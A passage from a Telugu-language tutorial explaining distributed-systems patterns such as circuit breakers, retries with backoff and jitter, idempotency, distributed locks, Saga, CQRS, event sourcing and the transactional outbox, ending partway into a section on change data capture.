1. **Service Registry:** ఇది ఒక గ్లోబల్ ఫోన్ బుక్ లాంటిది. ఏ కొత్త సర్వీస్ స్టార్ట్ అయినా, అది తన పేరు మరియు కరెంట్ ఐపీ అడ్రస్‌ని ఇందులో రిజిస్టర్ చేసుకుంటుంది.
2. **Discovery:** `Order-Service` కి పేమెంట్ చేయాల్సి వచ్చినప్పుడు, అది ఈ ఫోన్ బుక్ ని అడిగి `Payment-Service` యొక్క లైవ్ ఐపీ అడ్రస్‌ని తెచ్చుకుని కాల్ చేస్తుంది.

---

## 2. Circuit Breaker (ఫ్యూజ్ పోవడం)

మన ఇంట్లో కరెంట్ ఓవర్‌లోడ్ అయినప్పుడు లేదా షార్ట్ సర్క్యూట్ అయినప్పుడు మెయిన్ ఫ్యూజ్ (Circuit Breaker) ఆటోమేటిక్‌గా పడిపోతుంది (Trip అవుతుంది), దీనివల్ల ఇంట్లోని విలువైన వస్తువులు కాలిపోకుండా ఊరుకుంటాయి. సాఫ్ట్‌వేర్‌లో కూడా ఇదే కాన్సెప్ట్ వాడతాం (ఉదా: Netflix Hystrix, Resilience4j).

- **The Problem (Cascading Failure):** `Order-Service` అనేది `Payment-Service` పై ఆధారపడి ఉంది. ఏదో సమస్య వల్ల `Payment-Service` చాలా స్లో అయిపోయింది లేదా డౌన్ అయింది. ఇప్పుడు ఆర్డర్ సర్వీస్ నుండి వచ్చే ప్రతి రిక్వెస్ట్ పేమెంట్ సర్వీస్ కోసం వెయిట్ చేస్తూ థ్రెడ్స్ ని బ్లాక్ చేస్తుంది. ఇలా వెయిట్ చేసి చేసి చివరకు `Order-Service` కూడా క్రాష్ అవుతుంది. దీనివల్ల మొత్తం సిస్టమ్ ఒకదాని తర్వాత ఒకటి మునిగిపోతుంది (**Cascading Failure**).
- **The Solution:** రెండు సర్వీసెస్ మధ్య ఒక **Circuit Breaker** ని పెడతాం. ఇది మూడు స్టేట్స్‌లో పనిచేస్తుంది:

1. 🟢 **Closed (నార్మల్ స్టేట్):** అంతా బాగుంది. రిక్వెస్ట్‌లు యథావిధిగా వెళ్తుంటాయి.
2. 🔴 **Open (ట్రిప్ అయిన స్టేట్):** ఒకవేళ పేమెంట్ సర్వీస్ వరుసగా ఫెయిల్ అవుతుంటే (ఉదా: 50% రిక్వెస్ట్స్ ఫెయిల్ అయితే), సర్క్యూట్ ఓపెన్ అయిపోతుంది. ఇప్పుడు ఆర్డర్ సర్వీస్ పేమెంట్ సర్వీస్‌ని కాల్ చేయకుండా డైరెక్ట్‌గా "పేమెంట్ సర్వర్ బిజీగా ఉంది" అని వెంటనే ఫాల్‌బ్యాక్ (Fallback) ఎర్రర్ ఇచ్చేస్తుంది. దీనివల్ల థ్రెడ్స్ బ్లాక్ అవ్వవు, సిస్టమ్ క్రాష్ అవ్వదు.
3. 🟡 **Half-Open (టెస్టింగ్ స్టేట్):** కొంత సమయం తర్వాత, సర్క్యూట్ బ్రేకర్ నిమ్మదిగా ఒక చిన్న రిక్వెస్ట్‌ని పేమెంట్ సర్వీస్ కి పంపి చెక్ చేస్తుంది. ఒకవేళ అది సక్సెస్ అయితే సర్వీస్ బాగుపడింది అని గుర్తించి మళ్ళీ **Closed** స్టేట్ కి వస్తుంది. లేదంటే మళ్ళీ **Open** స్టేట్ కి వెళ్తుంది.

---

## 3. Bulkhead Pattern (డ్యామేజ్ కంట్రోల్)

- **What it is:** పెద్ద పెద్ద సముద్రపు ఓడలలో (Ships) లోపల పెద్ద రూమ్‌ని ఒకేలా ఉంచకుండా, చిన్న చిన్న గదులుగా (Bulkheads) విడగొడతారు. పొరపాటున ఓడకి ఎక్కడైనా రంధ్రం పడి నీళ్లు వస్తే, కేవలం ఆ ఒక్క గది మాత్రమే మునుగుతుంది, మిగతా గదుల వల్ల ఓడ సురక్షితంగా తేలుతూనే ఉంటుంది.
- **In System Design:** మన బ్యాకెండ్ సర్వర్‌లో 100 థ్రెడ్స్ (Workers) ఉన్నాయి అనుకుందాం. యూజర్లు ఆర్డర్స్ పెడుతున్నారు, అలాగే పాత రిపోర్ట్స్ డౌన్‌లోడ్ చేస్తున్నారు. రిపోర్ట్స్ డౌన్‌లోడ్ చేయడం చాలా స్లో ప్రాసెస్. ఒకవేళ అందరూ ఒకేసారి రిపోర్ట్స్ అడిగితే, ఆ 100 థ్రెడ్స్ రిపోర్ట్స్ కే సరిపోతాయి. ఇప్పుడు ఒక కొత్త యూజర్ వచ్చి ఆర్డర్ పెట్టాలన్నా థ్రెడ్ ఖాళీగా ఉండదు.
- **How it helps:** సర్వర్ లోని థ్రెడ్స్ ని లేదా రిసోర్సెస్ ని విడివిడిగా పూల్స్ (Pools) లాగా కేటాయించడం. (ఉదా: ఆర్డర్స్ కి 80 థ్రెడ్స్, రిపోర్ట్స్ కి కేవలం 20 థ్రెడ్స్ మాత్రమే ఇవ్వాలి). ఇప్పుడు రిపోర్ట్స్ సర్వీస్ ఎంత జామ్ అయినా, ఆ 20 థ్రెడ్స్ మాత్రమే బిజీ అవుతాయి. మిగతా 80 థ్రెడ్స్ తో ఆర్డర్స్ సర్వీస్ సూపర్ ఫాస్ట్‌గా రన్ అవుతూనే ఉంటుంది.

---

## 4. Retry Pattern (మళ్ళీ ప్రయత్నించడం)

- **What it is:** నెట్‌వర్క్‌లో తాత్కాలిక సమస్యలు (Transient Faults - ఉదాహరణకు 1 సెకను పాటు వైఫై సిగ్నల్ డ్రాప్ అవ్వడం) చాలా కామన్. క్లయింట్ కాల్ చేసినప్పుడు ఫస్ట్ టైమ్ ఎర్రర్ వస్తే వెంటనే చేతులెత్తేయకుండా, బ్యాకెండ్ ఆటోమేటిక్‌గా ఇంకోసారి ప్రయత్నించడమే **Retry**.
- **The Danger (Thundering Herd):** సర్వర్ డౌన్ అయినప్పుడు మనం బ్లైండ్‌గా వెంటనే మళ్ళీ మళ్ళీ కాల్స్ (Retry) చేస్తే, ఆల్రెడీ నష్టాల్లో ఉన్న సర్వీస్‌పై మరింత లోడ్ పడి అది శాశ్వతంగా క్రాష్ అవుతుంది.
- **The Professional Upgrade (Exponential Backoff & Jitter):**
- **Exponential Backoff:** ప్రతి ఫెయిల్యూర్ తర్వాత వెయిటింగ్ టైమ్‌ని పెంచడం. మొదటిసారి ఫెయిల్ అయితే 1 సెకను ఆగు, రెండోసారి ఫెయిల్ అయితే 2 సెకన్లు ఆగు, మూడోసారి 4 సెకన్లు ఆగు... అలా గ్యాప్ పెంచడం.
- **Jitter (రాండమ్‌నెస్):** వందల సర్వర్లు ఒకేసారి వెయిట్ చేసి ఒకే 4వ సెకనులో దాడి చేయకుండా ఉండటానికి, ఆ వెయిటింగ్ టైమ్‌కి కొంచెం రాండమ్ టైమ్ యాడ్ చేయడం (ఉదా: ఒక సర్వర్ 4.1 సెకన్లకి, ఇంకో సర్వర్ 3.9 సెకన్లకి కాల్ చేయడం). దీనివల్ల ట్రాఫిక్ స్మూత్ గా డిస్ట్రిబ్యూట్ అవుతుంది.

---

డిస్ట్రిబ్యూటెడ్ సిస్టమ్స్ (Distributed Systems) లో డేటా మిస్ అవ్వకుండా ఉండటానికి, డేటాబేస్ లు తప్పుగా అప్‌డేట్ అవ్వకుండా కాపాడటానికి, మరియు మల్టిపుల్ సర్వర్లు ఉన్నప్పుడు రేస్ కండిషన్స్ రాకుండా మేనేజ్ చేయడానికి వాడే అత్యంత అడ్వాన్స్‌డ్ ఆర్కిటెక్చర్ కాన్సెప్ట్స్ ఇవి.

వీటిని కూడా మన రియల్-వరల్డ్ ఉదాహరణలతో తెలుగులో స్పష్టంగా నేర్చుకుందాం.

---

## 1. Backoff (వెనక్కి తగ్గి వేచి ఉండటం)

మనం మునుపటి చాప్టర్‌లో Retry గురించి చూసినప్పుడు దీని బేసిక్ టచ్ చేశాం. ఇక్కడ దీని వెనుక ఉన్న అసలు మ్యాథ్స్ మరియు స్ట్రాటజీని చూద్దాం.

- **What it is:** ఒక సర్వీస్‌ని కాల్ చేసినప్పుడు అది ఫెయిల్ అయితే, వెంటనే మళ్ళీ మళ్ళీ దాడి చేయకుండా, కొంత సమయం ఆగి ప్రయత్నించే పద్ధతినే **Backoff** అంటారు.
- **Why we upgraded (The Evolution):**

1. **Fixed Backoff:** ఫెయిల్ అయిన ప్రతిసారీ కచ్చితంగా 2 సెకన్లు ఆగి ట్రై చేయడం. ఇది పెద్ద సిస్టమ్స్ లో ఫెయిల్ అవుతుంది. ఎందుకంటే 10,000 రిక్వెస్ట్‌లు ఒకేసారి ఫెయిల్ అయితే, ఆ 10,000 మళ్ళీ కరెక్ట్‌గా 2వ సెకనులో ఒకేసారి సర్వర్‌పై పడతాయి (**Thundering Herd Problem**).
2. **Exponential Backoff:** ఇక్కడ వెయిటింగ్ టైమ్‌ని డబుల్ చేస్తూ వెళ్తాం ($2^n$). ఫార్ములా ప్రకారం:

$$\text{Wait Time} = \text{Base} \times 2^{\text{attempt}}$$

మొదటిసారి ఫెయిల్ అయితే 1 సెకను, రెండోసారి 2 సెకన్లు, మూడోసారి 4 సెకన్లు, నాలుగోసారి 8 సెకన్లు... ఇలా గ్యాప్ పెంచడం వల్ల అవతలి సర్వర్‌ కోలుకోవడానికి టైమ్ దొరుకుతుంది. 3. **Exponential Backoff with Jitter (The Ultimate Upgrade):** కేవలం టైమ్ డబుల్ చేసినా, కొన్ని సర్వర్లు ఒకే టైమ్‌కి సింక్ అయ్యే ఛాన్స్ ఉంది. అందుకే ఆ టైమ్‌కి కొంచెం రాండమ్ వాల్యూ (**Jitter**) ని యాడ్ చేస్తాం. (ఉదాహరణకి ఒక సర్వర్ 4.2 సెకన్లు ఆగితే, ఇంకోటి 3.8 సెకన్లు ఆగుతుంది). అమెజాన్, గూగుల్ లాంటి కంపెనీలు తమ క్లౌడ్ ఆర్కిటెక్చర్‌లో దీన్నే స్టాండర్డ్ గా వాడుతాయి.

---

## 2. Idempotency (ఎన్నిసార్లు చేసినా ఒకే రిజల్ట్)

- **What it is:** ఒక అప్లికేషన్‌లో ఒకే రిక్వెస్ట్‌ని ఒకసారి పంపినా లేదా పొరపాటున నెట్‌వర్క్ లాగ్ వల్ల 10 సార్లు పంపినా, సిస్టమ్ స్టేట్ మాత్రం ఒక్కసారే మారాలి, డూప్లికేట్స్ రాకూడదు. ఆ ఫీచర్‌నే **Idempotency** అంటారు.
- **Real-World Example:** మీరు స్విగ్గీలో ఫుడ్ ఆర్డర్ పెట్టి "Pay" కొట్టారు. నెట్‌వర్క్ స్లోగా ఉంది, మీరు కంగారులో 3 సార్లు క్లిక్ చేశారు. ఒకవేళ బ్యాకెండ్ ఐడెంపోటెంట్ కాకపోతే, మీ అకౌంట్ నుండి 3 సార్లు డబ్బులు కట్ అవుతాయి. ఐడెంపోటెంట్ అయితే, ఫస్ట్ క్లిక్ కి మాత్రమే డబ్బులు కట్ అయి, మిగతా 2 రిక్వెస్ట్‌లను ఇగ్నోర్ చేస్తుంది.
- **How to implement:** ఫ్రంటెండ్ నుండి ఒక రిక్వెస్ట్ పంపే ముందే ఒక యూనిక్ **`Idempotency-Key`** (ఉదాహరణకు UUID: `f81d4fae-7dec...`) ని క్రియేట్ చేసి హెడర్స్ లో పంపాలి. బ్యాకెండ్ ఆ కీని మొదట **Redis** లో స్టోర్ చేసుకుంటుంది. మళ్ళీ అదే కీతో రిక్వెస్ట్ వస్తే, "ఇది ఆల్రెడీ ప్రాసెస్ అయిపోయింది" అని గుర్తించి పాత రెస్పాన్స్‌నే వెనక్కి ఇచ్చేస్తుంది.

---

## 3. Distributed Lock (గ్లోబల్ తాళం)

సాధారణంగా ఒకే కంప్యూటర్ లోపల మల్టిపుల్ థ్రెడ్స్ ఒకే డేటాని మార్చకుండా ఉండటానికి మనం OS బేసిక్స్ లో **Mutex/Locks** చూశాం. కానీ మన బ్యాకెండ్ 5 వేర్వేరు సర్వర్లలో (Horizontal Scaling) రన్ అవుతుంటే, ఆ 5 సర్వర్లకి కామన్‌గా లాక్ ఎలా వేయాలి? దాన్నే **Distributed Lock** అంటారు.

- **Real-World Example:** ఒక ఫ్లాష్ సేల్ (Flash Sale) లో ఒకే ఒక్క ఐఫోన్ ₹10,000 కి మిగిలి ఉంది. ఒకే మిల్లీసెకండ్‌లో ఢిల్లీ నుండి ఒక యూజర్, హైదరాబాద్ నుండి ఒక యూజర్ "Buy" కొట్టారు. ఢిల్లీ యూజర్ రిక్వెస్ట్ సర్వర్-1 కి, హైదరాబాద్ యూజర్ రిక్వెస్ట్ సర్వర్-2 కి వెళ్ళింది. రెండు సర్వర్లు విడివిడిగా డేటాబేస్ చెక్ చేస్తే "1 ఐటమ్ ఉంది" అని చూపిస్తుంది. ఇద్దరికీ అమ్మేస్తే సిస్టమ్ తప్పు అవుతుంది.
- **The Solution:** సర్వర్-1 మరియు సర్వర్-2 ల కంటే పైన ఒక గ్లోబల్ ఇన్-మెమరీ డేటాబేస్ అయిన **Redis** లేదా **Zookeeper** ని పెడతాం. ఏ సర్వర్ అయినా ఐటమ్‌ని ముట్టుకునే ముందు రెడిస్ లో ఒక సీక్రెట్ కీని క్రియేట్ చేస్తుంది (ఉదా: `SET iphone_lock true NX PX 5000`). కీ సక్సెస్ ఫుల్ గా క్రియేట్ అయిన సర్వర్ కి మాత్రమే లాక్ దొరికినట్లు. రెండో సర్వర్ కి లాక్ దొరకదు కాబట్టి అది వెయిట్ చేయాలి. పని అయిపోయాక ఫస్ట్ సర్వర్ లాక్ డిలీట్ చేస్తుంది. దీనికి మోస్ట్ పాపులర్ అల్గారిథమ్ **Redlock**.

---

## 4. Distributed Transactions (మల్టిపుల్ డేటాబేస్ ల మధ్య నమ్మకం)

- **The Problem:** మైక్రోసర్వీసెస్ లో ప్రతి సర్వీస్‌కి విడివిడిగా డేటాబేస్ ఉంటుంది (Database-per-service). ఒక ఆర్డర్ కంప్లీట్ అవ్వాలంటే:

1. `Order-Service` లో ఆర్డర్ క్రియేట్ అవ్వాలి (DB-1).
2. `Payment-Service` లో డబ్బులు కట్ అవ్వాలి (DB-2).
3. `Inventory-Service` లో స్టాక్ తగ్గాలి (DB-3).

ఒకవేళ 1, 2 స్టెప్స్ సక్సెస్ అయి, 3వ స్టెప్ (స్టాక్ లేదు అని) ఫెయిల్ అయితే ఎలా? పాత సింగిల్ డేటాబేస్ లాగా ఇక్కడ డైరెక్ట్‌గా SQL `ROLLBACK` కొట్టలేము, ఎందుకంటే ఇవి వేర్వేరు కంప్యూటర్లలోని వేర్వేరు డేటాబేస్ లు. దీన్నే Distributed Transaction సమస్య అంటారు.

### 🛠️ దీన్ని సాల్వ్ చేసే పద్ధతులు (Patterns)

1. **2PC (Two-Phase Commit - The Old Way):**
   यात ఒక మేనేజర్ (Coordinator) ఉంటాడు.

- **Phase 1 (Prepare):** మేనేజర్ అందరినీ అడుగుతాడు—"మీరు సేవ్ చేయడానికి రెడీగా ఉన్నారా?". అందరూ "రెడీ" అని చెప్తే...
- **Phase 2 (Commit):** మేనేజర్ "ఓకే, అందరూ సేవ్ చేసుకోండి" అని ఆర్డర్ ఇస్తాడు. ఏ ఒక్కడు కాదు అన్నా మొత్తం క్యాన్సిల్ అవుతుంది.
- _Why we upgraded:_ ఇది చాలా స్లో (Blocking). మేనేజర్ క్రాష్ అయితే సిస్టమ్ మొత్తం జామ్ అయిపోతుంది.

2. **Saga Pattern (The Modern Microservices Way):**
   ఇది అత్యంత పాపులర్ అప్రోచ్. ఇక్కడ ఒకే పెద్ద ట్రాన్సాక్షన్ ఉండదు. ప్రతి సర్వీస్ తన లోకల్ ట్రాన్సాక్షన్‌ని సక్సెస్ ఫుల్ గా ముగించి, నెక్స్ట్ సర్వీస్‌కి ఈవెంట్ (Kafka ద్వారా) పంపుతుంది.

- **Compensating Transactions (నష్టపరిహారం):** ఒకవేళ 3వ స్టెప్ (Inventory) ఫెయిల్ అయితే, సాగా ప్యాటర్న్ వెనక్కి ఒక రివర్స్ ఈవెంట్ ని పంపుతుంది. ఆ ఈవెంట్ ని చూసి `Payment-Service` యూజర్‌కి డబ్బులు రీఫండ్ చేస్తుంది, `Order-Service` ఆర్డర్‌ని క్యాన్సిల్ చేస్తుంది. అంటే తప్పు జరిగితే దాన్ని సరిదిద్దే రివర్స్ యాక్షన్స్ ని రన్ చేయడమే సాగా ప్యాటర్న్.

---

మైక్రోసర్వీసెస్ (Microservices) మరియు ఈవెంట్-డ్రివెన్ ఆర్కిటెక్చర్ (Event-Driven Architecture) లో డేటా మేనేజ్‌మెంట్ మరియు కన్సిస్టెన్సీ (Data Consistency) ని పక్కాగా హ్యాండిల్ చేయడానికి వాడే అత్యంత పవర్‌ఫుల్ మరియు అడ్వాన్స్‌డ్ డిజైన్ ప్యాటర్న్స్ ఇవి.

పెద్ద పెద్ద సిస్టమ్స్ డిజైన్ చేసేటప్పుడు (ఉదాహరణకు: Amazon, Netflix, Uber) ఎదురయ్యే క్లిష్టమైన సమస్యలని ఇవి ఎలా సాల్వ్ చేస్తాయో తెలుగులో క్లియర్‌గా, ప్రాక్టికల్ ఉదాహరణలతో నేర్చుకుందాం.

---

## 1. Saga Pattern (మైక్రోసర్వీసెస్ లో ట్రాన్సాక్షన్స్)

మనం మునుపటి చాప్టర్‌లో దీని బేసిక్ ఐడియా చూశాం. ఇక్కడ దీని రెండు ముఖ్యమైన ఇంప్లిమెంటేషన్ స్ట్రాటజీలను డీప్‌గా చూద్దాం.

- **What it is:** ఒక ఆర్డర్ ప్రాసెస్ కంప్లీట్ అవ్వడానికి మల్టిపుల్ సర్వీసెస్ (Order, Payment, Inventory) లోకల్ ట్రాన్సాక్షన్స్ చేయాలి. ఒకవేళ మధ్యలో ఏదైనా ఫెయిల్ అయితే, పాత స్టెప్స్ ని వెనక్కి తిప్పడానికి (Rollback చేయడానికి) రివర్స్ యాక్షన్స్ (**Compensating Transactions**) ని రన్ చేసే పద్ధతే సాగా ప్యాటర్న్.

### 🛠️ సాగా ని రెండు రకాలుగా డిజైన్ చేయవచ్చు:

1. **Choreography (కన్స్యూమర్ డ్రివెన్):**

- ఇక్కడ ఏ ఒక్క సెంట్రల్ మేనేజర్ ఉండడు. ప్రతి సర్వీస్ తన పని అవ్వగానే ఒక ఈవెంట్ ని (Kafka/RabbitMQ లోకి) వదులుతుంది. ఆ ఈవెంట్ చూసి నెక్స్ట్ సర్వీస్ అలర్ట్ అయి తన పని మొదలుపెడుతుంది.
- _ఉదాహరణ:_ `Order-Created` ఈవెంట్ ని చూసి `Payment-Service` మనీ కట్ చేస్తుంది. అది అయ్యాక `Payment-Success` ఈవెంట్ ని చూసి `Inventory-Service` స్టాక్ తగ్గిస్తుంది.
- _Pros/Cons:_ చాలా సింపుల్ యాప్స్ కి బాగుంటుంది, కానీ సర్వీసెస్ పెరిగేకొద్దీ ఏ ఈవెంట్ ఎక్కడికి వెళ్తుందో ట్రాక్ చేయడం కష్టమవుతుంది.

2. **Orchestration (మేనేజర్ డ్రివెన్ - The Upgrade):**

- ఇక్కడ ఒక సెంట్రల్ మేనేజర్ ఉంటాడు, అతన్నే **Saga Orchestrator** అంటారు. ఇతను ఒక ట్రాఫిక్ పోలీస్ లాగా ఏ సర్వీస్ తర్వాత ఏ సర్వీస్ రన్ అవ్వాలో డిసైడ్ చేస్తాడు.
- _How it works:_ ఆర్కెస్ట్రేటర్ మొదట పేమెంట్ సర్వీస్ కి "మనీ కట్ చెయ్" అని చెప్తాడు. అది సక్సెస్ అయ్యాక ఇన్వెంటరీ సర్వీస్ కి "స్టాక్ తగ్గించు" అని చెప్తాడు. ఒకవేళ ఇన్వెంటరీ ఫెయిల్ అయితే, ఆర్కెస్ట్రేటరే స్వయంగా పేమెంట్ సర్వీస్ కి "డబ్బులు రీఫండ్ చెయ్ (Compensate)" అని ఆర్డర్ వేస్తాడు.
- _Why it's better:_ పెద్ద పెద్ద కాంప్లెక్స్ సిస్టమ్స్ లో బిజినెస్ లాజిక్ అంతా ఒకే చోట (Orchestrator లో) ఉంటుంది కాబట్టి డీబగ్ చేయడం, మేనేజ్ చేయడం చాలా ఈజీ.

---

## 2. CQRS (Command Query Responsibility Segregation)

- **What it is:** ఒకే డేటాబేస్ మోడల్ ని డేటా రాయడానికి (Write) మరియు డేటా చదవడానికి (Read) వాడకుండా, రెండింటినీ విడివిడిగా రెండు భాగాలుగా విడగొట్టే ఆర్కిటెక్చర్.
- **Commands:** డేటాని మార్చే ఆపరేషన్స్ (`POST`, `PUT`, `DELETE`).
- **Queries:** డేటాని కేవలం చదివే ఆపరేషన్స్ (`GET`).

```text
               ┌─────────────────────────┐
               │       Client / UI       │
               └────┬───────────────▲────┘
                    │ (Command)     │ (Query)
                    ▼               │
         ┌─────────────┐     ┌──────┴──────┐
         │ Write Model │     │ Read Model  │
         └──────┬──────┘     └──────▲──────┘
                │                   │
                ▼                   │ (Sync via Events)
         ┌─────────────┐     ┌──────┴──────┐
         │  Write DB   ├────►│   Read DB   │
         │ (e.g. SQL)  │     │ (e.g. Redis)│
         └─────────────┘     └─────────────┘

```

- **Why we upgraded (The Problem):** ఒక ఈ-కామర్స్ సైట్ లో ప్రొడక్ట్ కొనడం (Write) చాలా సింపుల్—ఒక రో ఇన్సర్ట్ అవుతుంది. కానీ హోమ్‌పేజీ లో ప్రొడక్ట్స్ వెతకడం (Read) చాలా కాంప్లెక్స్—అక్కడ రేటింగ్స్, రివ్యూస్, డిస్కౌంట్స్ అన్నింటినీ జాయిన్ (Join) చేసి భారీ క్వెరీ రన్ చేయాలి. ఒకే డేటాబేస్ పై ఈ రెండు లోడ్స్ పడితే సిస్టమ్ స్లో అయిపోతుంది.
- **The Solution:** **Write DB** గా ఒక రిలేషనల్ డేటాబేస్ (MySQL/Postgres) ని వాడి, **Read DB** గా అత్యంత వేగవంతమైన NoSQL లేదా క్యాషే (Elasticsearch/Redis) ని వాడతాం. రైట్ డిబి లో డేటా మారిన ప్రతిసారీ ఒక ఈవెంట్ ద్వారా రీడ్ డిబి కి డేటా సింక్ అవుతుంది. దీనివల్ల రీడ్ క్వెరీలు 100x ఫాస్ట్ అవుతాయి.

---

## 3. Event Sourcing (డేటాబేస్ కి ఒక డైరీ)

- **What it is:** సాధారణంగా డేటాబేస్ లో ఒక యూజర్ తన అడ్రస్ మార్చితే, పాత అడ్రస్ స్థానంలో కొత్త అడ్రస్ ఓవర్‌రైట్ (Update) అవుతుంది. పాత డేటా పోతుంది. కానీ **Event Sourcing** లో డేటాని ఎప్పుడూ అప్‌డేట్ చేయరు. సిస్టమ్‌లో జరిగే ప్రతి చిన్న మార్పుని ఒక ఈవెంట్ రూపంలో ఒక "Append-Only" లాగ్ (Event Store) లో రాసుకుంటూ వెళ్తారు.
- **Real-World Example (Bank Account):** మీ బ్యాంక్ అకౌంట్ బ్యాలెన్స్ ₹5000 అనేది నేరుగా ఒక కాలమ్ లో స్టోర్ అవ్వదు. మీ అకౌంట్ హిస్టరీ లో:

1. `Account Opened` (+₹0)
2. `Money Deposited` (+₹10,000)
3. `Money Withdrawn` (-₹5,000)

ఈ ఈవెంట్స్ అన్నింటినీ మొదటి నుండి క్యాలిక్యులేట్ చేస్తే వచ్చే ఫైనల్ స్టేట్ ₹5000.

- **Why it's a massive upgrade:**

1. **Perfect Audit Log:** సిస్టమ్‌లో ఏ తప్పు జరిగినా, ఏ యూజర్ ఎప్పుడు ఏం మార్చాడో 100% పక్కాగా తెలుస్తుంది (Healthcare, Finance యాప్స్ లో ఇది అత్యంత ముఖ్యం).
2. **Time Travel:** మీ అప్లికేషన్ గత వారం లేదా గత సంవత్సరం ఇదే రోజున ఏ స్టేట్ లో ఉందో తెలుసుకోవాలన్నా ఈ ఈవెంట్స్ ని మళ్ళీ రన్ చేసి చూడవచ్చు (**Replay**).

- **The Catch:** ప్రతిసారీ మొదటి నుండి అన్ని ఈవెంట్స్ లెక్కించడం స్లో అవుతుంది కాబట్టి, ప్రతి 100 ఈవెంట్స్ కి ఒకసారి కరెంట్ స్టేట్ ని ఒక **Snapshot** లాగా సేవ్ చేసి ఉంచుతారు.

> 💡 **CQRS + Event Sourcing:** ఇండస్ట్రీలో ఈ రెండింటినీ కలిపి వాడుతారు. **Event Sourcing** అనేది Write Model గా పనిచేస్తుంది (అన్ని ఈవెంట్స్ ని స్టోర్ చేస్తుంది), మరియు ఆ ఈవెంట్స్ ని ప్రాసెస్ చేసి ఒక రీడ్-ఆప్టిమైజ్డ్ డేటాబేస్ ని బిల్డ్ చేయడం **CQRS Read Model** గా పనిచేస్తుంది.

---

## 4. Transactional Outbox Pattern (డేటాబేస్ మరియు మెసేజ్ క్యూ ల మధ్య సింక్)

- **The Problem (The Dual-Write Problem):** మీ `Order-Service` లో ఒక యూజర్ ఆర్డర్ పెట్టాడు. మీ కోడ్ లో మీరు రెండు పనులు చేయాలి:

1. ఆర్డర్ డేటాని మీ SQL డేటాబేస్ లో సేవ్ చేయాలి.
2. వేరే సర్వీసెస్ కి చెప్పడానికి Kafka లోకి `Order-Created` మెసేజ్ పంపాలి.

ఒకవేళ డేటాబేస్ లో సేవ్ అయ్యాక, కాఫ్కా నెట్‌వర్క్ డౌన్ అవ్వడం వల్ల మెసేజ్ ఫెయిల్ అయితే? లేదా కాఫ్కా కి మెసేజ్ వెళ్ళిపోయాక, డేటాబేస్ క్రాష్ అయి రోల్‌బ్యాక్ అయితే? డేటా అసమతుల్యత (Data Inconsistency) వస్తుంది. దీనినే డ్యూయల్-వైట్ ప్రాబ్లం అంటారు.

```text
 ┌────────────────────────────────────────────────────────┐
 │                   Order Service                        │
 │                                                        │
 │  ┌─────────────────┐      (In Same DB Transaction)     │
 │  │ Save Order Data ├──────────────┐                    │
 │  └─────────────────┘              ▼                    │
 │                           ┌───────────────┐            │
 │                           │ Save Event to │            │
 │                           │ Outbox Table  │            │
 │                           └───────┬───────┘            │
 └───────────────────────────────────┼────────────────────┘
                                     │ (Polls / CDC)
                                     ▼
                             ┌───────────────┐
                             │ Message Relay │ (Debezium)
                             └───────┬───────┘
                                     │
                                     ▼
                             ┌───────────────┐
                             │ Apache Kafka  │
                             └───────────────┘

```

- **The Solution (Outbox Pattern):** 1. మీ డేటాబేస్ లోనే **`Outbox`** అనే ఒక కొత్త టేబుల్‌ని క్రియేట్ చేయాలి.

2. మీరు ఆర్డర్ డేటాని సేవ్ చేసేటప్పుడే, అదే **SQL Database Transaction** లోపల, పంపాల్సిన కాఫ్కా మెసేజ్‌ని కూడా ఈ `Outbox` టేబుల్‌లో ఒక రో లాగా ఇన్సర్ట్ చేయాలి. SQL ACID రూల్స్ ప్రకారం ఐతే రెండు సేవ్ అవుతాయి, లేదా రెండు క్యాన్సిల్ అవుతాయి.
3. ఇప్పుడు బ్యాక్‌గ్రౌండ్‌లో ఒక చిన్న సర్వీస్ లేదా టూల్ (**Message Relay / Debezium**) నిరంతరాయంగా ఈ `Outbox` టేబుల్‌ని చెక్ చేస్తూ (Polling లేదా CDC - Change Data Capture ద్వారా), అందులో ఉన్న మెసేజ్‌లను సురక్షితంగా కాఫ్కా లోకి పుష్ చేస్తుంది. పుష్ చేసాక టేబుల్ లో ఆ రో ని డిలీట్ లేదా `Processed=true` అని మార్చుకుంటుంది.

- **Why it's a lifesaver:** దీనివల్ల మీ అప్లికేషన్ లేదా నెట్‌వర్క్ ఎప్పుడు క్రాష్ అయినా సరే, ఒక్క మెసేజ్ కూడా మిస్ అవ్వకుండా 100% గ్యారెంటీగా కాఫ్కా కి చేరుతుంది.

---

డిస్ట్రిబ్యూటెడ్ సిస్టమ్స్ (Distributed Systems) రోడ్‌మ్యాప్‌లో ఇవి అల్టిమేట్ మరియు అత్యంత అడ్వాన్స్‌డ్ కాన్సెప్ట్స్. వందల కొద్దీ సర్వర్లు ఉన్నప్పుడు, ప్రతీ సర్వర్ ఒకే మాటపై ఎలా నిలబడాలి (Agreement), ఒక సర్వర్ డౌన్ అయితే గ్రూప్‌ని నడిపించే లీడర్‌ని ఎలా ఎన్నుకోవాలి, మరియు డేటాబేస్ మార్పులను రియల్-టైమ్‌లో ఎలా ట్రాక్ చేయాలి అనేది ఈ టాపిక్స్ వివరిస్తాయి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. CDC (Change Data Capture)

మనం మునుపటి చాప్టర్ లో **Outbox Pattern** చూసినప్పుడు దీని పేరు విన్నాం. ఇక్కడ దీని మెకానిజం ఏంటో చూద్దాం.

- **What it is:** ఒక డేటాబేస్ లో జరిగే ప్రతి మార్పుని (Insert, Update, Delete) రియల్-టైమ్‌లో ట్రాక్ చేసి, ఆ మార్పును ఒక ఈవెంట్ రూపంలో వేరే సిస్టమ్స్ కి (ఉదాహరణకు Kafka, Redis, లేదా Search Engines కి) పంపే టెక్నాలజీ.
- **Why we upgraded (The Evolution):**

1. **Polling (పాత పద్ధతి):** మన బ్యాకెండ్ అప్లికేషన్ ప్రతి 5 సెకన్లకి డేటాబేస్ ని `SELECT * FROM users WHERE updated_at > ...` అని అడుగుతూనే ఉంటుంది. దీనివల్ల డేటాబేస్ పై విపరీతమైన లోడ్ పడుతుంది మరియు 5 సెకన్ల లాగ్ (Delay) ఉంటుంది.
